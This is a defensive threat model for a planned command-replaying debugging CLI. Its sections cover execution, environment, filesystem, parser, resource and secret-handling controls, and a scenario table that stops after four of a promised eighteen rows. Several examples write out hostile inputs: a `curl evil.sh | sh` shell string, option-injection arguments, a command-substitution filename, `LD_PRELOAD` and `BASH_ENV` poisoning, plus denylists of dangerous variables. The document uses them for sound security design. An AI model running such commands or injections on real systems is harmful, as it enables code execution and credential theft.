# Culprit: Security and Safety Threat Model

## Executive summary — Culprit’s value depends on causal integrity, so safety must be built into its experimental core

Culprit is a local differential-debugging tool, but it repeatedly executes arbitrary, user-supplied commands while importing attacker-influenced state from repositories, snapshots, configurations, and baseline files. Its attack surface is therefore broader than that of a typical read-only linter. A malicious command or snapshot can cause code execution, credential leakage, filesystem damage, denial of service, or a convincing but false causal conclusion. The greatest risk is not merely that Culprit may run untrusted code; it is that Culprit may appear to prove an unsafe action or report an untrusted result as if it were a validated finding.

The safest design refuses execution by default. A user must explicitly opt in to command execution, file import, out-of-tree input copying, network-enabled runs, long timeouts, and any snapshot field whose misuse could affect child behavior. Every experiment must use an absolute, allowlisted executable; an argument list rather than a shell string; a newly constructed, denylisted environment; an isolated, non-world-accessible workspace; and process-group-scoped termination. Secrets must be redacted before storage or display, outputs must be bounded, and unsafe parsers must never be used.

A reported minimal causal set must satisfy independently reproducible necessity and sufficiency checks, including a declared target environment, stable oracle, repetition where variance is detected, and a threshold for disagreement. Flaky, interactive, externally mutating, or nondeterministic commands must not produce unconditional “root cause found” claims. The required design position is simple: Culprit may explain failure, but it must never become a trusted automation primitive that executes, copies, reports, or deletes state on the basis of an unverified replay.

This document is a reasoning-based threat model. The external sources cited below establish general security principles; they are not claims about Culprit’s implementation, which does not yet exist. Where a requirement depends on the eventual operating system, container strategy, or command contract, it is stated as a mandatory verification or opt-in gate rather than an assumed property.

## 1. The security boundary is defined by state import and command execution, not by the CLI’s local deployment

Culprit executes locally, but locality does not imply trust. Its threat model must cover every input it reads, every command it runs, every artifact it writes, and every conclusion it reports.

Culprit imports state from repositories, CI snapshot JSON, configuration files, baseline files, and user-supplied command lines. It then repeatedly executes those commands in temporary workspaces while exposing selected environment state. An attacker who can influence any of those inputs may attempt code execution, credential theft, filesystem manipulation, denial of service, or false causal claims. “Offline” reduces network-exposure risk, but it does not eliminate local code execution, filesystem access, or state-confusion attacks.

### Primary assets

The assets below are the security-sensitive items that Culprit may access, emit, modify, or rely on during replay:

| Asset class | Examples | Primary concerns |
|---|---|---|
| Credentials and tokens | `AWS_*`, `GCP_*`, `GH_TOKEN`, `NPM_*`, SSH keys, `.netrc`, `.git/config`, `.aws/credentials`, signing keys, browser or desktop session tokens | Theft, disclosure in logs or reports, reuse by child processes |
| Identity and privilege | Effective UID/GID, sudo/session tickets, Linux capabilities, macOS TCC, Windows tokens | Local privilege escalation or confused execution context |
| User and project data | Source trees, `.env` files, shell history, mailboxes, browser state, databases, backups | Unintended copying, modification, exfiltration, or exposure in reports |
| Filesystem integrity | System files, shell rc files, cron material, editors, service units, package databases, login files | Path traversal, symlink following, TOCTOU, overwrite, or permission changes |
| Host resources | CPU, memory, processes, file descriptors, disk, PID space, battery, GPU | Fork bombs, memory exhaustion, disk fill, runaway loops, and denial of service |
| Experimental integrity | Exit codes, stdout, stderr, time, random state, tool behavior, filesystem state | False causal attribution caused by unobserved or mutable state |
| User trust and decisions | Culprit’s printed root-cause claim, diffs, recommended changes, and reproducer | A misleading result may cause a user to merge unsafe code, alter an environment, or weaken a security boundary |

### Trust boundaries

The CLI should be separated into three trust compartments:

1. **The operator compartment:** the human user and the explicit invocation. This is trusted to choose what may be run, but it is not trusted to have audited every line of a malicious repository or snapshot.
2. **The imported-state compartment:** repositories, fetched snapshots, configuration files, baseline files, tool manifests, and arbitrary strings imported from disk. These must be treated as untrusted input, regardless of where they were found.
3. **The child-execution compartment:** the user-supplied command and its descendants. This compartment must be treated as potentially hostile and monitored for resource abuse, even when the command is authorized.

A process may be the same user’s process while still representing different trust interests. The operator may legitimately ask Culprit to analyze a malicious build script, but that does not make the script’s environment variables, symlinks, configuration keys, or tool choices trustworthy. The authorization to import state is not the same as authorization to execute it.

### Attacker models

| Attacker | Capabilities | Security objective |
|---|---|---|
| Malicious repository | Controls checked-in build scripts, hooks, `.env` files, submodule URLs, filenames, symlinks, locale data, and shell configuration | Induce command execution, read adjacent project secrets, escape the workspace, persist through hooks, or bias Culprit’s conclusion |
| Malicious CI snapshot JSON | Controls declared environment variables, tool versions, file paths, cwd, hashes, and metadata | Trick Culprit into setting dangerous variables, copying attacker files, chasing symlinks, consuming memory, or claiming a factor is causal |
| Malicious command | Runs with Culprit’s authority in the experimental working directory | Exfiltrate the parent environment, spawn a fork bomb, fill disk, disable limits, manipulate a shared baseline, or lie to the oracle |
| Malicious config file | Controls allowlists, ignore patterns, paths, regexes, environment propagation, and tool mappings | Enable parser exploits, ReDoS, path escape, dangerous env propagation, or unintended executable selection |
| Local unprivileged user | Shares the host or can write to a directory above or beside the workspace | Win a TOCTOU race, plant a PATH binary or shared object, replace a snapshot, induce temp-dir collisions, or exhaust shared resources |
| Flaky or environment-sensitive command | May not be actively malicious but changes behavior across otherwise identical runs | Produces false positives and false negatives in delta debugging; if reported without qualification, it is still a safety defect |
| Network-accessible malicious resource | Can be reached if the command or a tool performs an online check | Turns an offline analysis boundary into a remote-code or data-exfiltration path |

The parent process must be designed as if any imported value is malicious. Values that appear inert in one context may become executable in another. A filename can become an option, an environment variable can become a shared object, a locale identifier can become a path, and a JSON string can become a billion-node object.

## 2. Culprit must not synthesize trust from convenience or isolated appearances

The CLI must begin in an inert state. Isolation, execution, file import, and reporting are distinct operations, and each must be authorized separately.

### The default state must be inert

Culprit must default to inspecting and planning only. It must not run the supplied command, copy untrusted files into the workspace, set environment variables from a snapshot, or write a report outside the sandbox until required flags and confirmations are present.

A successful planning run should emit a concrete, auditable experiment specification:

- the executable and every argument;
- the environment delta to apply;
- the parent directory of the isolated workspace;
- the working directory, umask, timeouts, and output limits;
- the input files selected for import;
- the oracle that distinguishes pass from fail;
- the secret-redaction policy; and
- the criteria that must be satisfied before a causal conclusion can be printed.

This specification becomes the unit of review. A user can inspect it before approving execution, and Culprit can retain it for auditing without turning the preview into an implicit execution.

### A sandbox must be more than a temporary directory

The isolated working directory must be created with secure, non-predictable naming, owned and accessible only by the running user, and located on a normal, executable filesystem. If the runtime supports it, the sandbox should use `O_NOFOLLOW` semantics, atomic open operations, restrictive permissions, and a hardened directory layout.

All files and directories must be created with least privilege. Parent directories must not be world-writable, and neither the CLI nor any child process should rely on a predictable `/tmp/culprit-*` name. Every imported file must be resolved once, opened by an absolute path without symlink targets changing beneath the program, copied under a new inode, and validated again before child access. Copying a path by name is not sufficient if an attacker may replace that path before the child opens it.

### Exit codes are experimental observations, not semantic proof

Exit code `0` must not automatically mean “pass,” and a non-zero exit code must not automatically mean “fail.” The user must supply an explicit oracle. For example, an invocation can capture exit code and output, or compare against a recorded baseline, but the oracle must not be silently reverse-engineered from the observed run.

A timeout must be distinguished from failure. Cancellation may have stopped a slow legitimate task, while a crash may be the very behavior the user wants to reproduce. Culprit must preserve this distinction in its internal model, report schema, and exit contract. A command that was killed cannot be treated as having returned the oracle’s “fail” result merely because execution ended unsuccessfully.

### The output must state what it did not prove

Culprit may identify a small candidate set, but the report must distinguish among four outcomes:

1. a candidate minimal sufficient set;
2. a candidate necessary set;
3. a stable, independently reproduced causal conclusion; and
4. an inconclusive result.

If a command changes behavior across repeated runs with no factor changed, that is experimental noise. It is not a proof of a root cause. The report must say so explicitly. “Culprit identified the cause” and “Culprit found a small input set that reproduced the observed behavior under bounded conditions” are materially different claims.

## 3. Command execution must be structurally immune to shell interpretation and option injection

Culprit must construct a complete, typed execution model before any child process starts. The command string is data until it has passed validation; afterward, it is an executable decision, not something to be re-parsed by a shell.

### Refuse command strings and interpolated shells by default

Culprit must not concatenate command fragments into a shell string, invoke `sh -c`, `bash -c`, `cmd /c`, `powershell`, or any equivalent, or use `shell=True`. If a shell is required, it must be selected through an explicit opt-in wrapper. That wrapper must not accept raw shell metacharacters from repositories, snapshot values, environment variables, file names, or paths.

The command must be parsed only once into:

- an executable;
- positional arguments;
- input bindings; and
- environment and filesystem state.

Each element must thereafter remain a distinct, immutable value. Quoting is not an alternative to structured execution. A value may look harmless after escaping but still become a dangerous option or operand when parsed by the target program.

### Select executables through an allowlist or absolute path

A user-supplied executable name must not be searched through an inherited `PATH`. The default must require one of the following:

- an absolute, canonical, and allowlisted executable path;
- a command identifier mapped in code to such a path; or
- an explicit opt-in allowing `PATH` lookup only from a constructed, trusted `PATH`.

Before execution, Culprit should verify:

- the file is a regular file or the specific executable type allowed by policy;
- it is not writable by untrusted users;
- it is not a symlink to an unapproved target, unless symlinks are explicitly permitted;
- it is outside world-writable directories; and
- it is located within a configured trusted tool tree where required.

On systems with capabilities or setuid binaries, the CLI should additionally require an opt-in capability mode. Otherwise, it should refuse to execute such binaries. The presence of a binary on a developer workstation is not sufficient reason to expose it to attacker-influenced arguments and environment state.

### Treat every argument as a potential option

An argument list prevents shell metacharacters from starting another command, but it does not stop the target program from interpreting an argument. A value such as `--output=/etc/cron.d/x`, `--checkpoint-action=exec=sh`, `--upload-pack=...`, `-e=...`, `--exec=...`, `--init-file=...`, `--rcfile=...`, `--restrict=` followed by a malicious value, or `-z "payload"` can change program behavior.

For untrusted values supplied through snapshot or repository state, Culprit must reject leading ASCII `-`, U+002D, U+2010–U+2015, and other Unicode minus, hyphen, or dash forms. Option-like values should be allowed only through an explicit, typed binding that names the intended parameter. Where a program documents a suitable end-of-options separator, the separator must be placed immediately before the first operand.

This control must apply separately to:

- filenames;
- directory names;
- tool-version strings;
- input values;
- environment values that are appended to a command; and
- strings that will later be stringified and parsed.

### Examples must be treated as adversarial syntax

Attackers may choose command names, file names, option values, output strings, and JSON/YAML values. Even if the operator “trusts the command,” they may not have audited every macro, hook, filename, locale, toolchain plugin, or child process invoked by that command. Culprit must preserve that distinction throughout parsing, planning, execution, logging, and reporting.

A file named `$(id > /tmp/pwn)` does not require shell interpretation to be dangerous. It may be mistaken for data, rendered into a script, used as an option-like operand, or passed to a tool that itself interprets its arguments. Safety depends on context, not on whether the value “looks like a command.”

## 4. The environment must be built from a known-good baseline, not filtered from an inherited one

Every process attribute that the parent can control should be set explicitly. Inheriting the surrounding environment preserves both user convenience and attacker-controlled execution controls.

### Start from a constructed baseline

Culprit should create a fresh environment containing only the minimum set required for the selected platform and toolchain. A practical baseline is `PATH`, `HOME`, `USER`, `LOGNAME`, `LANG`, `LC_ALL`, `TZ`, `TERM`, and a small number of other allowlisted variables.

Variables that control the Python interpreter—such as `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONDONTWRITEBYTECODE`, `PYTHONWARNINGS`, and similar—should not be inherited merely because Python is the host language. They should be set explicitly to values that do not alter Culprit’s own execution.

Every variable copied from a snapshot or the parent must be:

- validated as a finite string within a configured length;
- checked against an allowlist; and
- rejected or normalized if it could change loader, interpreter, shell, or filesystem behavior.

### Denylist known dangerous variables by default

The following categories must not be copied from an untrusted source without an explicit, reviewed opt-in:

| Environment control | Examples | Potential effect |
|---|---|---|
| Dynamic linking | `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `LD_DEBUG`, `LD_ORIGIN_PATH` | Load attacker-controlled libraries into a child process |
| Python behavior | `PYTHONPATH`, `PYTHONSTARTUP`, `PYTHONHOME`, `PYTHONINSPECT`, `PYTHONWARNINGS` | Alter Python imports, initialization, or execution |
| Shell initialization | `BASH_ENV`, `ENV`, `BASH_FUNC_*`, `PS4`, shell rc paths | Execute code on shell startup or debugging output |
| Word splitting and globbing | `IFS`, `GLOBIGNORE` | Change tokenization or filename expansion |
| Debugger and tracing hooks | `PYTHONBREAKPOINT` | Invoke an unexpected debugger or callable |
| Locale and conversion data | `LOCPATH`, `GCONV_PATH`, `NLSPATH`, `HOSTALIASES`, `RESOLV_HOST_CONF`, `TZDIR` | Load attacker-influenced locale, conversion, or resolver data |
| Numeric and CPU behavior | `OMP_NUM_THREADS`, `MALLOC_*` | Induce crashes, change parallelism, or affect allocators |
| Tmp/artifact placement | `TMPDIR` | Redirect temporary or cache output outside the sandbox |

This list is not exhaustive. The secure-execution model strips many such variables because they can affect dynamic linking and program behavior. Culprit should adopt the same assumption even when the process is not setuid: an attacker who controls snapshot metadata may attempt the same environmental-control attacks.

If the experimental hypothesis requires one of these variables, the variable should be named individually. Culprit should record its provenance, validate its value against a strict format, and require a scoped opt-in. “I want to test whether `LD_LIBRARY_PATH` matters” should become a typed, bounded experiment, not an inherited field copied from untrusted JSON.

### Make PATH an explicit, bounded decision

`PATH` should be set to a fixed allowlist of absolute directories. Entries should not be empty, relative, world-writable, or duplicated, and they should not contain unexpected separators or argument-like strings.

Culprit should refuse any `PATH` that contains:

- the current directory;
- an untrusted workspace;
- a world-writable directory;
- a directory writable by a local attacker; or
- an entry not permitted by the active configuration.

When the user wants to test a different tool version, the safest implementation is to map that version to a verified, absolute executable. Falling back to `PATH` search should require a separate opt-in.

### Treat locale, time, and encoding as executable inputs

`LANG`, `LC_*`, `TZ`, and umask determine program behavior and may affect collation, formatting, message text, filesystem permissions, and time calculations. Locale names and time zones should be matched against an allowlist of expected values. Unvalidated values must not be used to construct directory paths or shell strings.

Setting a process-wide locale concurrently from multiple worker threads is unsafe. Culprit should therefore set locale state serially in the parent before forking each experiment or run each experiment in a separate process. The same isolation discipline should apply to umask, working directory, and signal mask: initialize once before exec, never share mutable global state across replay workers, and do not assume that a previous run left the process in the documented default condition.

## 5. Filesystem operations must use atomic resolution and reopened handles, not checked names

File-import operations must be separated into three stages: authorization of the source, creation of the sandbox copy, and verification of the child-visible artifact. A check performed before open cannot be assumed to hold after open.

### Reject names that can become commands or paths

File names, directory names, and input paths must be rejected by default if they:

- contain path separators;
- begin with a dash;
- contain shell metacharacters;
- contain Unicode dashes or whitespace that may be normalized into executable syntax; or
- exceed a configured length.

A repository filename is not automatically a safe command argument, cwd, or log token. When Culprit must display a name, it should render the value in a quoted, non-clickable evidence field and separately store a validated internal identifier.

### Copy files by handle and verify the copy again before use

Every file selected from a repository or snapshot should be:

1. resolved once to an absolute path;
2. opened with flags that do not follow final-component symlinks where the OS supports it;
3. checked for file type, ownership, size, and permissions;
4. copied into a new, access-restricted sandbox file; and
5. revalidated before being exposed to the child.

Hard links, symlinks, FIFOs, sockets, device files, and overly large files must be rejected by default. A cwd should not be copied as a tree unless every descendant is recursively validated and the user has opted into recursive import.

The check before copying and the use by the child occur at different times and may operate on different filesystem names. The copy must therefore be treated as the authoritative artifact, while the source must be considered untrusted after validation.

### Remove TOCTOU from baseline access

Baseline files should be opened once with atomic, symlink-resistant semantics where available. Their absolute resolved paths should be stored, but the original names should not be reopened before each experiment.

If repeated comparison is required, the file should be opened once, its inode or handle retained where the platform permits, or a verified read-only copy should be created and used throughout the replay. Changes to the live baseline should not alter an in-progress experiment. Otherwise, an attacker who modifies the baseline during execution can invalidate the oracle, change the comparison target, or corrupt the experiment’s outcome.

### Constrain copies and writes within the sandbox

Every write destination must be constructed from an allowed base directory. Culprit must verify that the result remains within that directory after canonicalization, and it must not accept absolute paths, `..` segments, or symlinks that escape the sandbox.

If the CLI supports writing reports outside the sandbox, that destination must be:

- specified explicitly by the user;
- outside the untrusted workspace;
- checked for symlink escape after resolution; and
- created with restrictive permissions.

The same rule applies to caches, diff outputs, crash reports, and reproducer scripts. A crash artifact that escapes the sandbox can turn a debugging feature into a persistence or overwrite mechanism.

## 6. Parsing must never execute, expand, or catastrophically recurse on untrusted input

Configuration and snapshot files must be parsed as plain data, not as objects, code, templates, or implicitly bounded documents. Validation must occur after parsing and must cover type, range, length, path, and semantic relationships.

### Use safe loaders and validate the resulting values

YAML must be parsed with a safe loader. The full loader must not be used for untrusted configuration or snapshot files. Safe parsing avoids arbitrary object construction, but it does not validate the document’s meaning.

After parsing, Culprit must validate:

- the top-level type;
- allowed keys;
- value types and ranges;
- string lengths;
- path values;
- environment-variable names and values;
- tool identifiers; and
- the relationship among fields.

Nested structures should be limited by depth, element count, and total allocation. Alias expansion must be bounded to prevent billion-laughs-style memory exhaustion.

### Never use pickle for interchange

Pickle must not be used for CI snapshots, configuration, caches, or reports. No signature, version check, or schema validation can safely compensate for untrusted pickle input. If legacy pickle support is unavoidable, it must be disabled by default and require a separate command, not an automatic file extension handler.

The safe replacement is a plain, versioned data format such as JSON, followed by explicit schema validation. Unknown fields should be rejected. Deserialization must not call user-defined constructors, import modules, resolve callable paths, or evaluate embedded Python expressions.

### Treat JSON as hostile structured data

`json.loads` does not execute code by itself, but it can still produce:

- deeply nested structures;
- huge strings;
- enormous arrays;
- duplicate keys;
- numbers outside the expected range; or
- values that later become command, path, or regex inputs.

Culprit must enforce limits on:

- document size;
- parsing time;
- nesting depth;
- array and object length;
- string length; and
- total node count.

Numbers should be parsed as strings and converted only to required, bounded types. Duplicate keys should be rejected unless the schema explicitly allows a documented merge rule. A JSON document is trusted only as a serialization format, not as a source of executable decisions.

### Run ignore-pattern regexes in linear time

User-supplied ignore patterns must not be passed directly to a backtracking regex engine without limits. The safer approach is to use a linear-time engine that does not support constructs known to require backtracking.

If a backtracking engine is unavoidable, the system should:

- compile and analyze patterns before use;
- reject nested quantifiers, overlapping alternation, and unbounded backreferences;
- cap input length;
- cap match CPU time or instruction budget; and
- run matching in a worker that can be cancelled.

Glob patterns should be converted to deterministic automata where possible. User-supplied patterns must never be concatenated into a shell command. A pattern is data unless the implementation deliberately provides a feature that turns it into executable syntax.

## 7. Replay experiments require resource boundaries at the process group, workspace, and scheduler levels

Limits must cover wall-clock time, CPU time, address space, file-descriptor count, output size, disk use, and concurrency. A command killed at the end of a generous timeout can still exhaust memory or fill disk earlier in the run.

### Kill the process group, not only the PID

Culprit must place each child in a new session or process group and retain that group identifier. On timeout or cancellation, it should send a terminating signal to the entire group, reap descendants, and continue signaling only until a bounded escalation deadline.

The implementation should assume that a child may:

- spawn background workers;
- create daemons;
- open long-lived servers;
- establish FIFOs;
- ignore `SIGTERM`; or
- call `setsid` or `setpgrp`.

Therefore, the parent must retain enough state to kill the whole group. A single `Popen.terminate()` call is not a resource boundary.

The sequence should be:

1. apply a graceful signal;
2. wait briefly;
3. apply a stronger signal if processes remain; and
4. after escalation, treat unreaped processes as an environmental failure rather than a successful experiment.

A second stage should scan for known leaked descendant identifiers when the runtime exposes safe enumeration. If no safe enumeration exists, the CLI should instead require an isolation layer that can guarantee cleanup, such as a container or dedicated VM.

### Bound output and disk use before they reach the terminal

Stdout and stderr must be captured into bounded in-memory or temporary-file buffers. A runaway command should not be allowed to fill the terminal, pipe buffer, disk, or parent memory.

The CLI should:

- stop reading or truncate output after a configured cap;
- record the truncation event;
- avoid decoding untrusted output as UTF-8 without replacement;
- prevent output from being interpreted as a terminal control sequence; and
- prevent very large reports from being written before the run completes.

For input, `stdin` should default to `/dev/null` or a verified empty source. Interactive commands should be rejected by default. A child that expects a controlling terminal may hang or behave nondeterministically; a malicious child may also send terminal-control sequences to the parent’s display if output is rendered without sanitization.

### Make all quotas composable and visible

Per-run quotas must include:

- wall-clock timeout;
- CPU-time limit;
- maximum memory;
- file-descriptor limit;
- maximum output bytes;
- maximum sandbox disk use; and
- maximum number of child processes.

Concurrency must also be bounded. Limits must be reported in the experiment specification and final report. Otherwise, an experiment that times out under one configuration cannot be compared fairly with one that runs under another.

If the operator declines to set a limit, Culprit should refuse long or unbounded executions. Defaults must be deliberately conservative. If the host supports containers, cgroups, or similar isolation mechanisms, those controls must be preferred over in-process limits.

### Detect interactive and asynchronous behavior

A command that opens `/dev/tty`, waits for input, launches an editor, starts a long-lived service, or remains connected after its main process exits should fail the experiment. A service that continues running after the wrapper exits should also be treated as environmental leakage.

Culprit should therefore verify that the process group has been reaped and that no authorized subprocess remains. This is both a denial-of-service control and an experimental-integrity control. A surviving child may alter a later replay or retain access to the workspace.

## 8. Secret leakage must be prevented before logging, reporting, or comparison

A secret that never entered the experimental record cannot be leaked by a child process, written into a report, or inferred from a diff. Redaction must therefore begin at collection time, not at display time.

### Default to an empty exported secret set

Culprit must not automatically export AWS, GCP, Azure, GitHub, npm, PyPI, SSH, signing, database, or other credentials. `HOME`, shell rc files, and dotfiles should not be copied into the sandbox unless the user explicitly permits them.

The CLI should maintain an internal list of secret-like variable names, but it must not rely on name matching alone. Any variable whose value resembles a token, private key, password, or bearer credential should be redacted or blocked. Values that decode to structured secret material, such as JSON or PEM, should be blocked rather than merely masked.

Secrets that are genuinely required for reproduction should be supplied through a separate mechanism with explicit scope, not pasted into a snapshot. The preferred mechanism is a reference to a secret store or a file outside the workspace. The value should be readable only by the target child, injected for that run alone, and never written into the report, baseline, cache, or reproducer.

### Redact recursively and structurally

Redaction must apply to:

- environment values;
- command arguments;
- file contents selected for import;
- diffs;
- error messages;
- debug output; and
- the final report.

Simple substring masking is insufficient. A secret may appear in base64, percent-encoding, JSON, logs, compiler messages, stack traces, or a diff of two environments.

Culprit should:

- tokenize values before comparison;
- hash or replace high-entropy values consistently;
- mark a factor as “secret” rather than echoing its value; and
- refuse to print raw values even when they are shorter than the redaction threshold.

Comparison logic must be able to determine that two secret-bearing fields differ without learning or displaying the underlying secret.

### Secret-bearing experiments must not emit reusable reproducers

A command, Dockerfile-like line, reproducer, or JSON snippet that contains real tokens must never be written to disk, standard output, or a shareable report. Instead, the output should identify the secret by name and scope and instruct the operator to provide it through the approved injection mechanism.

This rule also applies to files that appear innocuous. A `.env` file, shell rc file, or Git configuration may contain credentials even if its filename does not resemble a token store. Importing the file because it is “part of the environment” may therefore turn a debugging convenience into a credential-disclosure channel.

### Treat child output as untrusted display input

Stdout and stderr may contain ANSI escape sequences, terminal titles, hyperlinks, RTL overrides, or control characters. Culprit must sanitize all output before displaying it or writing it to a terminal-aware format.

The safest display is plain text. If styled output is necessary, terminal sequences must be stripped and only a small, allowlisted subset permitted. A malicious command should not be able to disguise a report, corrupt a log viewer, or influence the operator through terminal-side rendering.

## 9. Causal claims require reproducibility and explicit uncertainty

Delta debugging can find a small input set that changes the observed outcome, but it does not prove that the retained factors are the only relevant variables. Culprit must preserve that distinction and refuse to publish a stronger conclusion than its evidence supports.

### Necessity and sufficiency require separate experiments

Before printing that a factor set is minimal, Culprit should independently verify two properties:

- **Sufficiency:** rerun the command using only the candidate factor set and obtain the target outcome repeatedly where appropriate.
- **Necessity:** for every selected factor, remove it from the candidate set and demonstrate that the observed outcome reverts or that the factor’s inclusion is otherwise justified.

The term “all-but-each-one” in the tool description is conceptually useful, but it should not be the only test. If the factors interact, the system should also test promising two-factor and higher-order combinations up to a configurable interaction order. Otherwise, ddmin may return a locally minimal set that is not a valid explanation.

For example, a command may fail only when `LANG=en_US.UTF-8` and `TZ=UTC` are both set. Removing either factor may change the result back to “pass,” even though neither factor alone is sufficient. Reporting only one of them as the root cause would be false.

### Randomness and concurrency make reproduction part of the experiment

Culprit must preserve a seeded random-number generator state, monotonic clocks, system time where feasible, filesystem order, and parallelism. It must expose a separate entropy source to the child only through explicit opt-in.

A user-supplied seed should not be passed through a raw environment variable without normalization. Instead, it should be mapped to the specific generator expected by the target tool. A seed intended for one program may be meaningless or harmful when interpreted by another.

For any command that cannot be made deterministic, the tool must:

- repeat the experiment;
- estimate outcome variance; and
- raise an inconclusive result when the result is unstable.

One pass or failure after changing a factor does not distinguish cause from luck.

### The oracle must be stable, explicit, and limited

The user must declare how to compare:

- exit codes;
- output predicates;
- output hashes;
- file hashes; or
- recorded baseline states.

The oracle must not silently absorb a secret-bearing baseline. If it does, the experiment may report that a credential “causes” a behavior while actually exposing the credential in logs.

Culprit must reject oracles that:

- invoke shell commands;
- write outside the sandbox;
- use untrusted patterns;
- compare unboundedly large outputs;
- depend on mutable external state; or
- cannot be reproduced without privileged resources.

### Record a complete, tamper-evident experiment record

Each run should record:

| Category | Required record |
|---|---|
| Version | Culprit version and configuration digest |
| Inputs | Exact command, arguments, executable path, and permissions |
| Filesystem | Working directory and selected file hashes |
| Environment | Full exported environment, with secret-bearing values redacted |
| Execution policy | Effective umask, PATH, locale, timezone, timeouts, and resource limits |
| Host constraints | Operating system and architecture |
| Reproducibility | Random seed, start time, and monotonic clock |
| Results | Exit status, signal, timeout state, truncated-output indicator, and stdout/stderr digests |
| Workspace state | Sandbox and baseline provenance |
| Validity | Repetition count, variance, and conditions under which the conclusion is valid |

For higher-assurance use, the report may include a hash chain over these fields. The record must distinguish the planned experiment, the observed result, and the inferred conclusion. A run cannot prove a causal claim merely because it produced an exit code.

### Conclude only at an explicit confidence level

The report should classify results as follows:

- **Proved:** both necessity and sufficiency were independently reproduced under the declared environment.
- **Supported:** the candidate set reproduced the result across repeated runs, but the protocol could not fully exclude uncontrolled variables.
- **Candidate:** the set was identified under bounded delta debugging but not independently validated.
- **Inconclusive:** outcome variance, resource failure, or environmental leakage prevented a reliable conclusion.
- **Invalid:** the experiment violated a safety or policy constraint.

A “root cause found” claim must not be produced for a candidate or inconclusive result. The available evidence may support a debugging hypothesis; it does not establish causation.

## 10. Safe-by-design checklist: refuse by default, opt in explicitly, redact structurally, bound before execution, and verify before concluding

The following controls are mandatory. They should be enforced before execution, before writing any artifact, and again before a causal conclusion is printed.

### What must be refused by default

- Running an untrusted command without an explicit execution opt-in.
- `shell=True`, `sh -c`, shell interpolation, or any string-based command construction.
- Executable selection through an inherited `PATH`.
- Environment variables not on an allowlist, including all loader-, interpreter-, and shell-control variables.
- Arguments that begin with option-like characters or contain shell metacharacters.
- Symlinks, hard links, device files, FIFOs, sockets, and files with unexpected types.
- Recursive import of untrusted directory trees.
- Copying files into a directory that is not access-restricted and owned by the running user.
- World-writable, predictable, or shared temporary directories.
- Secret-bearing files such as `.env`, `.git/config`, SSH keys, cloud credentials, and browser state.
- Full YAML, pickle, `eval`, `exec`, or arbitrary object reconstruction.
- Unrestricted document depth, length, output size, disk use, CPU time, and process count.
- Background or daemonized children that outlive the parent.
- Interactive commands and controlling-terminal allocation.
- Network access during an “offline” replay unless explicitly enabled.
- File writes or symlink targets outside the sandbox unless the user specifies and confirms an explicit external destination.
- Oracles based on executable commands or writes outside the sandbox.
- Reports that include raw secret values, full unredacted outputs, or shell-injectable reproducer strings.
- A causal conclusion when the conclusion cannot be independently reproduced.

### What requires explicit opt-in

- Command execution.
- Use of a shell or shell-compatible wrapper.
- Executables selected through `PATH`.
- Setuid, setgid, or capability-bearing binaries.
- Individual dangerous environment variables.
- Specific locale and timezone values.
- A user-supplied umask.
- Recursive copying of source trees.
- Files outside the repository root.
- Hard links and symlinks.
- Secret values supplied by reference.
- Long timeouts and high resource quotas.
- Network access.
- Container, VM, or other isolation backends.
- Daemon-style or long-lived commands.
- Recursive delta debugging.
- Interaction-order testing beyond pairs.
- External report destinations.
- Raw, full-length stdout or stderr capture.
- Telemetry and crash reporting.
- Auto-application of the identified fix.
- Deletion of files or workspaces outside the ephemeral sandbox.

### What must be redacted or structurally minimized

- Environment-variable names and values matching secret patterns.
- Secret files and substrings found during import.
- Command arguments and config values.
- stdout, stderr, stack traces, compiler messages, and diffs.
- Report fields, reproducer snippets, and cache entries.
- File paths that disclose home directories or unrelated project names.
- Binary content, which should be stored only as hashes or type metadata unless required.
- Terminal control sequences, which should be stripped from all stored output.

The default report should describe a difference in categorical terms, such as “environment variable `FOO` differed,” rather than publishing the values.

### What must be bounded

- Snapshot byte size, parse time, depth, node count, and alias expansion.
- Regex input length, compile time, match time, and automaton size.
- File size, count, depth, symlink hops, and total import bytes.
- Output buffer size, truncation behavior, and maximum log size.
- Sandbox disk quota and inode count.
- Wall-clock timeout, CPU-time limit, memory limit, and file-descriptor count.
- Number of child processes, process-group lifetime, and concurrent replay workers.
- Delta-debugging rounds, candidate-set size, interaction order, and repeated trials.
- Report size, redaction-buffer size, and number of displayed file paths.

Budgets must be validated before the corresponding work begins. Post hoc termination cannot recover memory or disk that was already consumed.

### What must be verified before printing a conclusion

1. The executable exists, is allowlisted or absolute, is not setuid/capability-abusing unless authorized, and has stable permissions.
2. Every argument is a validated, distinct element and no argument is option-like unless explicitly bound.
3. The environment was constructed rather than inherited, and no denylisted variable was exported.
4. `PATH`, locale, timezone, and umask conform to policy.
5. The sandbox and cwd are restricted, canonical, non-symlink-escaping, and non-world-writable.
6. Every imported input file was opened safely and revalidated before use.
7. The baseline was opened safely and was not mutated during the experiment.
8. The child process group was created, killed completely, reaped, and found to have no surviving descendants.
9. Timeouts, truncation, and output limits were applied correctly.
10. No secret was written into a log, report, artifact, or reproducer.
11. The sufficiency set reproduced the declared result under repetition.
12. Necessity was tested for every factor, or a clearly documented approximation was used.
13. Variance was estimated and remained within the declared inconclusive threshold.
14. The report is classified as candidate, supported, proved, or inconclusive rather than overstating causation.
15. All external files written by the report were created with restrictive permissions and without symlink escape.

## 11. The minimum scenario set spans execution, environment, filesystem, parser, resource, and conclusion integrity

The following table contains 18 concrete scenarios. They are representative, not exhaustive. Every attack scenario should be covered by at least one automated negative test that proves the default configuration refuses the operation or limits its effect.

| # | Attack scenario | Exploit description | Impact | Required mitigation |
|---|---|---|---|---|
| 1 | Malicious command with shell metacharacters | Repository supplies `clean; curl evil.sh | sh`. Culprit builds a string and passes it to `sh -c`. | Arbitrary code execution in the user’s session. | Refuse shell strings; use an argument list with `shell=False`; never interpolate. |
| 2 | Argument injection through a filename | File is named `--output=/etc/cron.d/x`. It is passed as a plain argument to a compiler or archiver. | File overwrite or execution through a tool option. | Reject leading `-` and Unicode dash forms; bind options explicitly; use end-of-options where supported. |
| 3 | `LD_PRELOAD` poisoning | Snapshot sets `LD_PRELOAD=/workspace/evil.so`. Culprit exports it into the child environment. | Attacker shared object runs in every child process. | Denylist loader variables; use a constructed allowlist; require individual opt-in. |
| 4 | `BASH_ENV` initialization injection | Malicious `.env` content sets `BASH_ENV=/workspace/rc`, which a shell invoked by the command sources. | Arbitrary shell code runs even though Culprit did not execute the shell directly. | Do not inherit shell rc variables; prevent shell startup files from entering the environment; block shell invocation unless opted in. |
